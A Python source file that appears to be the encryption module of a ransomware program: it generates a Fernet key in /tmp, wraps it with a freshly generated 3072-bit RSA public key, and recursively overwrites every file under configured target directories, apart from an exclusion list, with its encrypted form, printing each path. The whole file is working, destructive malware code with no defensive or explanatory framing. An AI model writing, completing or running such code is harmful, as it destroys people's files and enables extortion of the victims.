import os
import rsa
import glob
from cryptography.fernet import Fernet
from config import Color, DIRS, EXCLUDED_FILES


def create_symmetric_key() -> (bytes, str):
    """
    Generate AES key

    :return: Symmetric key
    """

    os.chdir('/tmp')

    symmetric_key = Fernet.generate_key()
    with open('key.key', 'wb') as keyfile:
        keyfile.write(symmetric_key)

    key_path = '/tmp/key.key'

    return symmetric_key, key_path


def create_asymmetric_key():
    """
    Generate public and private key
    """
    os.chdir('/tmp')
    (pubkey, privkey) = rsa.newkeys(3072)

    pukey = open('publickey.key', 'wb')
    pukey.write(pubkey.save_pkcs1('PEM'))
    pukey.close()

    prkey = open('privatekey.key', 'wb')
    prkey.write(privkey.save_pkcs1('PEM'))
    prkey.close()


def encrypt_symmetric_key() -> None:
    pkey = open('publickey.key', 'rb')
    pkdata = pkey.read()
    pubkey = rsa.PublicKey.load_pkcs1(pkdata)

    keyfilepath = '/tmp/key.key'
    with open(keyfilepath, 'rb') as enc_key:
        data = enc_key.read()
    encrypted_key = rsa.encrypt(data, pubkey)
    with open(keyfilepath, 'wb') as enc_key:
        enc_key.write(encrypted_key)


def encrypt_target_files(symmetric_key) -> None:
    """
    Find target files to encrypt
    """

    for file_path in DIRS:
        for file in glob.iglob(file_path + '/**', recursive=True):
            if file not in EXCLUDED_FILES:
                try:
                    encrypting(file, symmetric_key)
                    print(Color.GREEN + '[#] Encrypting: ' + Color.WHITE + file)
                except:
                    continue


def encrypting(file, symmetric_key):
    with open(file, 'rb') as sub_file:
        content = sub_file.read()
    content_encrypted = Fernet(symmetric_key).encrypt(content)
    with open(file, 'wb') as sub_file:
        sub_file.write(content_encrypted)
